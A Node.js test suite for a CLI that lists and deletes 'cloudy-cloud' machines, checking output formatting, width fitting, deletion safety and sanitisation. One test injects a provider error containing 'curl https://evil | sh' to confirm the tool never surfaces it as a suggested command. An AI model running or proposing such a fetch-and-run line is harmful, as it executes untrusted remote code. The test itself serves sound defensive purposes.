import './tmp-cleanup.mjs';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, chmodSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { run } from '../src/machines.mjs';
import { cellWidth, makeUi } from '../src/ui.mjs';
import { createFakeProvider } from './fake-provider.mjs';

const ttyUi = () => makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'en_US.UTF-8' }, cols: 80 });
const pipeUi = () => makeUi({ tty: false });

// Every rendered line (ANSI stripped, embedded \n split) must fit the terminal width.
const assertWidths = (strings, cols) => {
  for (const s of strings) for (const l of s.replace(/\x1b\[[0-9;]*m/g, '').split('\n')) assert.ok(cellWidth(l) <= cols, `${cellWidth(l)} cells > ${cols}: ${l}`);
};

const make = (provider, { name, role = 'worker', labels = {}, ttlSeconds = 21_600 } = {}) =>
  provider.create({ name, labels: { purpose: 'cloudy-cloud', role, ...labels }, ttlSeconds });

const deps = (over = {}) => {
  const provider = createFakeProvider();
  const out = [], err = [];
  const d = {
    provider, env: { FAKE_API_KEY: 'k' }, events: () => [], tty: false, ui: pipeUi(),
    out: (s) => out.push(s), err: (s) => err.push(s), ...over,
  };
  return { provider, out, err, d };
};

test('ls piped prints a TSV header and one row per machine', async () => {
  const { provider, out, d } = deps();
  await make(provider, { name: 'w-one' });
  await make(provider, { name: 'c-one', role: 'coordinator', labels: { name: 'boss' } });
  assert.equal(await run(['ls'], d), 0);
  assert.equal(out[0], 'NAME\tROLE\tSTATE\tSTARTED\tDELETES\tID');
  assert.match(out[1], /^w-one\tworker\trunning\t\d{4}-\d{2}-\d{2}T.*\tfake-1$/);
  assert.match(out[2], /^boss\tcoordinator\trunning\t.*\tfake-2$/);
  assert.equal(out.length, 3, out.join('\n'));
});

test('ls on a terminal prints a table ending with the count and a Next', async () => {
  const { provider, out, d } = deps({ tty: true, ui: ttyUi() });
  await make(provider, { name: 'w-one' });
  await make(provider, { name: 'w-two' });
  assert.equal(await run([], d), 0);
  const text = out.join('\n').replace(/\x1b\[[0-9;]*m/g, '');
  assert.match(text, /NAME\s+ROLE\s+STATE\s+AGE\s+DELETES/);
  assert.match(text, /w-one\s+worker\s+running/);
  assert.match(text, /2 running\./);
  assert.match(text, /Next: cloudy-cloud machines stop/);
});

test('ls with no machines prints the empty line in both modes', async () => {
  for (const d of [deps().d, deps({ tty: true, ui: ttyUi() }).d]) {
    const out = [];
    assert.equal(await run(['ls'], { ...d, out: (s) => out.push(s) }), 0);
    assert.deepEqual(out, ['No Cloudy Cloud machines running.']);
  }
});

test('an image machine shows the image role and a machine without a role shows machine', async () => {
  const { provider, out, d } = deps();
  await make(provider, { name: 'img', role: 'coordinator-image' });
  await provider.create({ name: 'old', labels: { purpose: 'cloudy-cloud' }, ttlSeconds: 600 });
  assert.equal(await run([], d), 0);
  assert.match(out[1], /^img\timage\t/);
  assert.match(out[2], /^old\tmachine\t/);
});

test('stop NAME deletes that machine only and prints it', async () => {
  const { provider, out, d } = deps();
  const a = await make(provider, { name: 'w-one' });
  const b = await make(provider, { name: 'w-two' });
  assert.equal(await run(['stop', 'w-one'], d), 0);
  assert.deepEqual(provider.log.delete, [a.id]);
  assert.match(out.join('\n'), /Deleted w-one \(fake-1\)/);
  assert.ok(provider.machines.has(b.id), 'the other machine is left alone');
});

test('stop resolves an agent id to its machine through the event log', async () => {
  const { provider, d } = deps();
  const a = await make(provider, { name: 'w-one' });
  d.events = () => [{ t: 1, id: '7c1e90ab', type: 'agent' }, { t: 2, id: '7c1e90ab', type: 'machine', machine: a.id }];
  assert.equal(await run(['stop', '7c1e90ab'], d), 0);
  assert.deepEqual(provider.log.delete, [a.id]);
});

test('stop of an unknown id is a plain error and deletes nothing', async () => {
  const { provider, err, d } = deps();
  await make(provider, { name: 'w-one' });
  assert.equal(await run(['stop', 'nope'], d), 1);
  assert.match(err.join('\n'), /Unknown id "nope"/);
  assert.equal(provider.log.delete.length, 0);
});

test('stop --all without --yes refuses off a terminal and deletes nothing', async () => {
  const { provider, err, d } = deps();
  await make(provider, { name: 'w-one' });
  assert.equal(await run(['stop', '--all'], d), 1);
  assert.match(err.join('\n'), /--yes/);
  assert.equal(provider.log.delete.length, 0);
});

test('stop --all --yes deletes every listed machine and says so', async () => {
  const { provider, out, d } = deps();
  await make(provider, { name: 'w-one' });
  await make(provider, { name: 'c-one', role: 'coordinator' });
  assert.equal(await run(['stop', '--all', '--yes'], d), 0);
  assert.equal(provider.log.delete.length, 2);
  assert.match(out.join('\n'), /Deleted w-one/);
  assert.match(out.join('\n'), /Deleted 2 machines\./);
});

test('stop --all on a terminal asks once; n deletes nothing, y deletes all', async () => {
  const { provider, d } = deps({ tty: true, ui: ttyUi() });
  await make(provider, { name: 'w-one' });
  const asked = [];
  assert.equal(await run(['stop', '--all'], { ...d, ask: async (q) => (asked.push(q), 'n') }), 0);
  assert.equal(asked.length, 1);
  assert.match(asked[0], /1 Cloudy Cloud machine|1 machine/);
  assert.equal(provider.log.delete.length, 0);
  assert.equal(await run(['stop', '--all'], { ...d, ask: async () => 'y' }), 0);
  assert.equal(provider.log.delete.length, 1);
});

test('stop deletes a machine that is not running', async () => {
  const { provider, d } = deps();
  d.list = async () => [{ id: 'm1', name: 'stuck', labels: { purpose: 'cloudy-cloud' }, state: 'starting', status: 'starting', startedAt: Date.now() }];
  assert.equal(await run(['stop', 'stuck'], d), 0);
  assert.deepEqual(provider.log.delete, ['m1']);
});

test('stop resolves a machine id before any machine name', async () => {
  const { provider, d } = deps();
  await provider.create({ name: 'fake-2', labels: { purpose: 'cloudy-cloud', role: 'worker' }, ttlSeconds: 60 }); // fake-1, named like fake-2
  const a = await provider.create({ name: 'w-one', labels: { purpose: 'cloudy-cloud' }, ttlSeconds: 60 }); // id fake-2
  assert.equal(await run(['stop', a.id], d), 0);
  assert.deepEqual(provider.log.delete, [a.id], 'the id match wins over the earlier row named the same');
});

test('stop resolves the agent label as well as the event log', async () => {
  const { provider, d } = deps();
  const a = await make(provider, { name: 'w-one', labels: { agent: 'ag-9' } });
  assert.equal(await run(['stop', 'ag-9'], d), 0);
  assert.deepEqual(provider.log.delete, [a.id]);
});

test('stop by a name shared by two machines is refused, not guessed', async () => {
  const { provider, err, d } = deps();
  await make(provider, { name: 'dup' });
  await make(provider, { name: 'dup' });
  assert.equal(await run(['stop', 'dup'], d), 1);
  assert.match(err.join('\n'), /2 machines.*id instead/s);
  assert.equal(provider.log.delete.length, 0);
});

test('stop checks the list again right before deleting one machine', async () => {
  const { provider, d } = deps();
  const a = await make(provider, { name: 'w-one' });
  const row = (m) => ({ id: m.id, name: m.name, labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() });
  let calls = 0;
  d.list = async () => (++calls === 1 ? [row(a)] : []);
  const out = [];
  assert.equal(await run(['stop', 'w-one'], { ...d, out: (s) => out.push(s) }), 0);
  assert.equal(provider.log.delete.length, 0, 'a machine gone before the delete is skipped');
  assert.match(out.join('\n'), /already gone/);
});

test('stop --all deletes only ids still present after the prompt', async () => {
  const { provider, d } = deps({ tty: true, ui: ttyUi() });
  const a = await make(provider, { name: 'w-one' });
  const b = await make(provider, { name: 'w-two' });
  const row = (m) => ({ id: m.id, name: m.name, labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() });
  let calls = 0;
  d.list = async () => (++calls === 1 ? [row(a), row(b)] : [row(a)]); // w-two disappears while the user reads the prompt
  const out = [];
  assert.equal(await run(['stop', '--all'], { ...d, out: (s) => out.push(s), ask: async () => 'y' }), 0);
  assert.deepEqual(provider.log.delete, [a.id]);
  assert.match(out.join('\n'), /Deleted 1 machine\./);
});

test('machine fields with control characters print on one line', async () => {
  const { d } = deps();
  d.list = async () => [{ id: 'm\nevil', name: 'bad\nname', labels: { purpose: 'cloudy-cloud', role: 'work\ner' }, state: 'run\x1b[31mning', status: 'running', startedAt: Date.now(), deleteAt: 'x' }];
  const out = [];
  assert.equal(await run(['ls'], { ...d, out: (s) => out.push(s) }), 0);
  for (const line of out) assert.ok(!/[\x1b\n\r]/.test(line), line);
  assert.match(out[1], /^bad name\twork er\trunning\t.*m evil$/);
});

test('provider errors print sanitised on one line', async () => {
  const { d } = deps();
  d.list = async () => { throw new Error('oops\n\x1b[31mbad'); };
  const err = [];
  assert.equal(await run([], { ...d, err: (s) => err.push(s) }), 1);
  for (const line of err) assert.ok(!/[\x1b\n\r]/.test(line), line);
  assert.match(err.join('\n'), /oops bad/);
});

test('the provider key under its CLOUDY_CLOUD_ name counts as signed in', async () => {
  const { provider, out, d } = deps();
  d.env = { CLOUDY_CLOUD_FAKE_API_KEY: 'k' };
  assert.equal(await run([], d), 0);
  assert.equal(provider.log.list.length, 2, 'the cloudy-cloud purpose plus the historical claude-cloud one');
  assert.deepEqual(out, ['No Cloudy Cloud machines running.']);
});

test('machines without the cloudy-cloud purpose label are never listed or deleted', async () => {
  const { provider, d } = deps();
  const ours = await make(provider, { name: 'w-one' });
  const row = (m, extra = {}) => ({ id: m.id ?? m, name: m.name ?? m, labels: {}, state: 'running', status: 'running', startedAt: Date.now(), ...extra });
  d.list = async () => [row(ours, { labels: { purpose: 'cloudy-cloud' } }), row('foreign-1', { name: 'not-ours' })];
  const out = [], err = [];
  assert.equal(await run(['ls'], { ...d, out: (s) => out.push(s) }), 0);
  assert.equal(out.length, 2, 'header plus the one labelled machine');
  assert.equal(await run(['stop', '--all', '--yes'], { ...d, out: (s) => out.push(s), err: (s) => err.push(s) }), 0);
  assert.deepEqual(provider.log.delete, [ours.id]);
  assert.equal(await run(['stop', 'not-ours'], { ...d, err: (s) => err.push(s) }), 1);
  assert.match(err.join('\n'), /Unknown id "not-ours"/);
});

test('the provider is asked only for our machines: the cloudy-cloud purpose and the historical claude-cloud one', async () => {
  const { provider, d } = deps();
  await run([], d);
  assert.deepEqual(provider.log.list, [{ purpose: 'cloudy-cloud' }, { purpose: 'claude-cloud' }]);
});

test('machines labelled with the historical claude-cloud purpose are listed and stopped like ours', async () => {
  const { provider, out, d } = deps();
  await provider.create({ name: 'w-old', labels: { purpose: 'claude-cloud', role: 'worker', name: 'w-old' }, ttlSeconds: 60 });
  assert.equal(await run(['ls'], d), 0);
  assert.match(out[1], /^w-old\tworker\t/);
  assert.equal(await run(['stop', 'w-old'], d), 0);
  assert.equal(provider.log.delete.length, 1);
});

test('without the provider key the error is the provider\'s own fix text', async () => {
  const { err, d } = deps();
  d.env = {};
  assert.equal(await run([], d), 1);
  assert.match(err.join('\n'), /Set FAKE_API_KEY\./);
  assert.doesNotMatch(err.join('\n'), /is not signed in/);
});

test('bad arguments print usage to stderr and exit 2', async () => {
  for (const args of [['bogus'], ['stop'], ['ls', 'extra']]) {
    const err = [];
    assert.equal(await run(args, { ...deps().d, err: (s) => err.push(s) }), 2, args.join(' '));
    assert.match(err.join('\n'), /Usage: cloudy-cloud machines/);
  }
});

// ---- round 4: terminal error shape, width fitting, msb readiness, coordinator hint ----

const msbDirs = () => {
  const root = mkdtempSync(join(tmpdir(), 'cc-mach-msb-'));
  const home = join(root, 'home'), bin = join(root, 'bin');
  mkdirSync(join(home, '.local/bin'), { recursive: true });
  mkdirSync(bin);
  return { home, bin };
};
const msbProvider = (noKeyFix) => ({ ...createFakeProvider(), name: 'microsandbox', keyName: 'CLOUDY_CLOUD_MSB_BIN',
  text: { ...createFakeProvider().text, ...(noKeyFix ? { noKeyFix } : {}) } });

test('on microsandbox an msb found by the path ladder counts as ready (CLOUDY_CLOUD_MSB_BIN unset)', async () => {
  const { home, bin } = msbDirs();
  writeFileSync(join(bin, 'msb'), '#!/bin/sh\nexit 0\n');
  chmodSync(join(bin, 'msb'), 0o755);
  const provider = msbProvider();
  const d = { provider, env: { HOME: home, PATH: bin }, events: () => [], tty: false, ui: pipeUi(), out: () => {}, err: () => {} };
  assert.equal(await run(['ls'], d), 0);
  assert.equal(provider.log.list.length, 2, 'the cloudy-cloud purpose plus the historical claude-cloud one');
});

test('on microsandbox with no msb anywhere the error is the provider noKeyFix, not a sign-in line', async () => {
  const { home } = msbDirs();
  const provider = msbProvider('The microsandbox CLI (msb) was not found.\nInstall it:\n  install-msb-stub\nOr set CLOUDY_CLOUD_MSB_BIN.');
  const err = [];
  const d = { provider, env: { HOME: home, PATH: '' }, events: () => [], tty: false, ui: pipeUi(), out: () => {}, err: (s) => err.push(s) };
  assert.equal(await run(['ls'], d), 1);
  assert.equal(provider.log.list.length, 0, 'the provider is never asked');
  assert.match(err.join('\n'), /microsandbox CLI \(msb\) was not found/);
  assert.doesNotMatch(err.join('\n'), /is not signed in\. Run: cloudy-cloud setup/);
});

test('on a terminal a missing key prints the fix text as an indented command Next', async () => {
  const { home } = msbDirs();
  const provider = msbProvider('The microsandbox CLI (msb) was not found.\nInstall it:\n  install-msb-stub\nOr set CLOUDY_CLOUD_MSB_BIN.');
  const err = [];
  const d = { provider, env: { HOME: home, PATH: '' }, events: () => [], tty: true, ui: ttyUi(), out: () => {}, err: (s) => err.push(s) };
  assert.equal(await run(['ls'], d), 1);
  const text = err.join('\n');
  const plain = text.replace(/\x1b\[[0-9;]*m/g, '');
  assert.match(plain, /✖ The microsandbox CLI \(msb\) was not found\./);
  assert.match(plain, /Next: install-msb-stub/);
  assertWidths(text.split('\n'), 80);
});

test('on a terminal a missing fake key ends on the setup Next', async () => {
  const { err, d } = deps({ tty: true, ui: ttyUi() });
  d.env = {};
  assert.equal(await run([], d), 1);
  const text = err.join('\n');
  assert.match(text, /✖/);
  assert.match(text, /Set FAKE_API_KEY\./);
  assert.match(text, /Next: cloudy-cloud setup/);
});

test('on a terminal stop errors print ✖ + dim detail + one Next, all within the width', async () => {
  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
  await make(provider, { name: 'w-one' });
  assert.equal(await run(['stop', 'nope'], d), 1);
  const text = err.join('\n');
  const plain = text.replace(/\x1b\[[0-9;]*m/g, '');
  assert.match(plain, /✖ Unknown id "nope"\./);
  assert.match(plain, /Running machines: w-one\./);
  assert.match(plain, /Next: cloudy-cloud machines ls/);
  assertWidths(text.split('\n'), 80);
});

test('on a terminal a duplicated name error keeps the ids inside the width', async () => {
  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
  await make(provider, { name: 'dup' });
  await make(provider, { name: 'dup' });
  assert.equal(await run(['stop', 'dup'], d), 1);
  const text = err.join('\n');
  assert.match(text, /✖/);
  assert.match(text, /fake-1/);
  assert.match(text, /Next: cloudy-cloud machines ls/);
  assertWidths(text.split('\n'), 80);
});

test('stop --all on a terminal asks with the name list on a fitted sub-line', async () => {
  const { provider, d } = deps({ tty: true, ui: ttyUi() });
  for (let i = 0; i < 8; i++) await make(provider, { name: `agent-${'abcdefgh'[i]}${i}` });
  const asked = [];
  assert.equal(await run(['stop', '--all'], { ...d, ask: async (q) => (asked.push(q), 'n') }), 0);
  const q = asked[0];
  assert.match(q, /Delete 8 Cloudy Cloud machines\?/);
  assert.match(q, /\(agent-a0.*\+\d+ more\)/s);
  assert.match(q, /\[y\/N\]/);
  for (const l of q.split('\n')) assert.ok(cellWidth(l) <= 80, l);
});

test('stop --all deletion and summary lines stay inside the width', async () => {
  const { provider, out, d } = deps({ tty: true, ui: ttyUi() });
  for (let i = 0; i < 8; i++) await make(provider, { name: `a-very-long-agent-machine-name-${i}` });
  assert.equal(await run(['stop', '--all', '--yes'], d), 0);
  assertWidths(out, 80);
});

test('the NAME column uses the terminal width: full names at 120, fitted at 80', async () => {
  const wide = deps({ tty: true, ui: makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'en_US.UTF-8' }, cols: 120 }) });
  await make(wide.provider, { name: 'nightly-docs-refresh-worker' });
  assert.equal(await run([], wide.d), 0);
  assert.match(wide.out.join('\n'), /nightly-docs-refresh-worker\s/);
  assertWidths(wide.out, 120);

  const narrow = deps({ tty: true, ui: ttyUi() });
  await make(narrow.provider, { name: 'nightly-docs-refresh-worker' });
  assert.equal(await run([], narrow.d), 0);
  assertWidths(narrow.out, 80);
});

test('stop NAME of a coordinator adds the workers hint on a terminal', async () => {
  const { provider, out, d } = deps({ tty: true, ui: ttyUi() });
  await make(provider, { name: 'boss', role: 'coordinator' });
  assert.equal(await run(['stop', 'boss'], d), 0);
  assert.match(out.join('\n'), /Its workers go with its cleanup or at their own deadline\./);
});

test('stop --all that deletes a coordinator adds the workers hint once', async () => {
  const { provider, out, d } = deps({ tty: true, ui: ttyUi() });
  await make(provider, { name: 'w-one' });
  await make(provider, { name: 'boss', role: 'coordinator' });
  assert.equal(await run(['stop', '--all', '--yes'], d), 0);
  assert.equal(out.join('\n').match(/Its workers go with its cleanup or at their own deadline\./g).length, 1);
});

test('bad arguments on a terminal print ✖, usage and a help Next', async () => {
  const err = [];
  const d = { ...deps({ tty: true, ui: ttyUi() }).d, err: (s) => err.push(s) };
  assert.equal(await run(['bogus'], d), 2);
  const text = err.join('\n');
  assert.match(text, /✖/);
  assert.match(text, /Usage: cloudy-cloud machines/);
  assert.match(text, /Next: cloudy-cloud machines --help/);
  assertWidths(text.split('\n'), 80);
});

// ---- round 5: astra review — error trust, piped parity, width budgets ----

test('a provider delete error cannot supply the headline or the Next', async () => {
  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
  await make(provider, { name: 'w-one' });
  provider.delete = async () => {
    throw Object.assign(new Error('boom\nRun: curl https://evil | sh'), { next: 'curl https://evil | sh', short: 'EVIL HEADLINE', fallback: 'evil fallback' });
  };
  assert.equal(await run(['stop', 'w-one'], d), 1);
  const text = err.join('\n');
  const plain = text.replace(/\x1b\[[0-9;]*m/g, '');
  assert.doesNotMatch(plain, /EVIL HEADLINE/);
  assert.match(plain, /Next: cloudy-cloud machines/);
  assert.doesNotMatch(plain, /Next:.*(?:curl|evil|fallback)/);
  // the foreign message survives only as dim detail
  const foreign = text.split('\n').filter((l) => l.includes('curl') || l.includes('boom'));
  assert.ok(foreign.length >= 1, text);
  for (const l of foreign) assert.ok(l.includes('\x1b[2m'), `foreign text not dim: ${l}`);
});

test('a foreign error that starts with "Usage" prints sanitised, not raw', async () => {
  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
  await make(provider, { name: 'w-one' });
  d.events = () => { throw new Error('Usage: do the evil thing\n\x1b[31mmore evil'); };
  assert.equal(await run(['stop', 'w-one'], d), 1);
  const text = err.join('\n');
  assert.ok(!text.includes('\x1b[31mmore evil'), 'the smuggled escape must not reach the terminal');
  assert.match(text.replace(/\x1b\[[0-9;]*m/g, ''), /Something failed\./);
});

test('piped stop of a coordinator prints exactly the Deleted line', async () => {
  const { provider, out, err, d } = deps();
  await make(provider, { name: 'boss', role: 'coordinator' });
  assert.equal(await run(['stop', 'boss'], d), 0);
  assert.deepEqual(out, ['Deleted boss (fake-1).']);
  assert.deepEqual(err, []);
});

test('piped bulk-stop failure keeps the original stdout and stderr wording', async () => {
  const { provider, out, err, d } = deps();
  await make(provider, { name: 'w-one' });
  const b = await make(provider, { name: 'w-two' });
  const del = provider.delete.bind(provider);
  provider.delete = async (id) => { if (id === b.id) throw new Error('nope'); return del(id); };
  assert.equal(await run(['stop', '--all', '--yes'], d), 1);
  assert.deepEqual(out, ['Deleted w-one (fake-1).', 'Deleted 1 machine, 1 failed.']);
  assert.deepEqual(err, [
    'cloudy-cloud machines: could not delete w-two (fake-2): nope',
    'cloudy-cloud machines: 1 of 2 machines could not be deleted. List what is left: cloudy-cloud machines',
  ]);
});

test('a bulk-delete failure budgets the name with the id and never truncates the diagnostic', async () => {
  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
  const longId = `id-${'x'.repeat(33)}`; // 36 cells
  d.list = async () => [{ id: longId, name: 'n'.repeat(35), labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() }];
  provider.delete = async () => { throw new Error(`provider refused: ${'word '.repeat(40)}END`); };
  assert.equal(await run(['stop', '--all', '--yes'], d), 1);
  assertWidths(err, 80);
  const plain = err.join('\n').replace(/\x1b\[[0-9;]*m/g, '');
  assert.match(plain, /provider refused:/);
  assert.match(plain, /END/, 'the end of the diagnostic survives — wrapped, not truncated');
});

test('the --all prompt measures the real "+N more" suffix', async () => {
  const { d } = deps({ tty: true, ui: ttyUi() });
  d.list = async () => [
    { id: 'm0', name: 'x'.repeat(80), labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() },
    ...Array.from({ length: 100 }, (_, i) => ({ id: `m${i + 1}`, name: `w-${i}`, labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() })),
  ];
  const asked = [];
  assert.equal(await run(['stop', '--all'], { ...d, ask: async (q) => (asked.push(q), 'n') }), 0);
  assert.match(asked[0], /\+100 more/);
  for (const l of asked[0].split('\n')) assert.ok(cellWidth(l) <= 80, l);
});

test('ls on a 40-column terminal keeps every line inside the width', async () => {
  const ui40 = makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'en_US.UTF-8' }, cols: 40 });
  const { provider, out, d } = deps({ tty: true, ui: ui40 });
  await make(provider, { name: 'ワーカー-machine' });
  await make(provider, { name: 'w-two' });
  assert.equal(await run([], d), 0);
  assertWidths(out, 40);
});

test('error screens fit the width under LANG=C, where the mark is wider', async () => {
  const uiC = makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'C' }, cols: 80 });
  const { provider, err, d } = deps({ tty: true, ui: uiC });
  await make(provider, { name: 'w-one' });
  assert.equal(await run(['stop', 'n'.repeat(62)], d), 1); // first wrapped line lands right at the edge
  assertWidths(err, 80);
});
